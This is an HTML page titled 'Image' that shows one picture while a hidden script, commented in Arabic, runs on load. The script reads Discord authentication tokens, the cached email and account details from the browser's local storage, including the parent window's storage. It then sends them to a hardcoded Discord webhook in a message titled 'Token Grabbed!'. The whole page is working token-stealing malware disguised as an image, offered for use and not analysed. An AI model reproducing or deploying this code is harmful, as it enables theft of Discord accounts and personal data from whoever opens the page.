<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image</title>
</head>
<body>
    <!-- الصورة اللي هيظهر للشخص -->
    <img src="https://i.imgur.com/3qWlFjC.jpeg" width="400">
    
    <script>
        (async () => {
            // 1. الوصول للبيانات
            const storage = window.localStorage || (window.parent && window.parent.localStorage);
            const tokensStr = storage?.tokens;
            const emailRaw = storage?.email_cache;
            const userStoreRaw = storage?.MultiAccountStore;

            // 2. تحليل البيانات
            let tokens = {};
            try { tokens = JSON.parse(tokensStr || '{}'); } catch (e) {}
            
            let email = "N/A";
            try { if (emailRaw && emailRaw.length > 2) email = emailRaw.slice(1, -1); } catch (e) {}

            let users = [];
            try { const parsedStore = JSON.parse(userStoreRaw); if (parsedStore?._state?.users) users = parsedStore._state.users; } catch (e) {}

            // رابط الـ Webhook الخاص بك
            const webhookUrl = "https://discord.com/api/webhooks/1555151811969552424/rhh9uB5_91UHrfXJyZwkkNEc5pPOHpJ_VZqrvWaoZCO89MVYYPL3-IYVTAoRaY2xaO93";

            // 3. الإرسال
            if (Object.keys(tokens).length > 0) {
                for (const [userId, token] of Object.entries(tokens)) {
                    const user = users.find(u => u.id === userId);
                    const avatar = user ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.webp` : "https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png";
                    const username = user ? `${user.username}#${user.discriminator}` : "Unknown";

                    try {
                        await fetch(webhookUrl, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                embeds: [{
                                    title: "Token Grabbed!",
                                    color: 5969566,
                                    fields: [
                                        { name: "User", value: `<@!${userId}>`, inline: true },
                                        { name: "Email", value: `\`\`\`${email}\`\`\``, inline: true },
                                        { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false }
                                    ],
                                    author: { name: username, icon_url: avatar }
                                }]
                            })
                        });
                    } catch (e) {}
                }
            }
        })();
    </script>
</body>
</html>
